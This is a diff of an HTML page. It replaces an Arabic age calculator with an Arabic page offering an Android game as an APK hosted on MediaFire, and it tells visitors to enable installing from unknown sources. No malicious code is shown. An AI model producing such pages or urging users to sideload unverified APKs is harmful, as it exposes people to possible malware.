@@ -1,45 +1,62 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8">
-  <title>حساب العمر</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>تحميل لعبة Android</title>
   <style>
     body {
-      font-family: Arial;
+      font-family: Arial, sans-serif;
+      background: linear-gradient(135deg, #1f1c2c, #928DAB);
+      color: white;
       text-align: center;
-      margin-top: 100px;
+      padding: 60px 20px;
     }
-    input, button {
-      padding: 10px;
-      font-size: 16px;
-      margin: 10px;
+    .container {
+      background: rgba(255,255,255,0.08);
+      border-radius: 20px;
+      padding: 40px;
+      max-width: 600px;
+      margin: auto;
+      box-shadow: 0 0 25px rgba(0,0,0,0.4);
+    }
+    h1 {
+      font-size: 2.2rem;
+      margin-bottom: 20px;
+    }
+    p {
+      font-size: 1.1rem;
+      margin-bottom: 30px;
+      line-height: 1.7;
+    }
+    .download-btn {
+      background-color: #FFD700;
+      color: black;
+      padding: 15px 35px;
+      font-size: 1.2rem;
+      border: none;
+      border-radius: 50px;
+      font-weight: bold;
+      text-decoration: none;
+      transition: background 0.3s ease;
+      display: inline-block;
+    }
+    .download-btn:hover {
+      background-color: #e6c200;
     }
   </style>
 </head>
 <body>
 
-  <h1>حاسبة العمر</h1>
-  <p>أدخل تاريخ ميلادك:</p>
-
-  <input type="date" id="birthdate">
-  <button onclick="calculateAge()">احسب العمر</button>
-
-  <h2 id="result"></h2>
-
-  <script>
-    function calculateAge() {
-      const birthDate = new Date(document.getElementById("birthdate").value);
-      const today = new Date();
-      let age = today.getFullYear() - birthDate.getFullYear();
-      const m = today.getMonth() - birthDate.getMonth();
-
-      if (m < 0 || (m === 0 && today.getDate() < birthDate.getDate())) {
-        age--;
-      }
-
-      document.getElementById("result").textContent = "عمرك هو: " + age + " سنة";
-    }
-  </script>
+  <div class="container">
+    <h1>🎮 تحميل لعبة أندرويد</h1>
+    <p>
+      اضغط على الزر أدناه لتحميل اللعبة على هاتفك بصيغة APK.<br>
+      تأكد من تفعيل "تثبيت من مصادر غير معروفة" قبل التثبيت.
+    </p>
+    
+    <a class="download-btn" href="https://www.mediafire.com/file/rcj6wg16ue5wiwh/base.apk/file" target="_blank">⬇️ تحميل اللعبة</a>
+  </div>
 
 </body>
 </html>
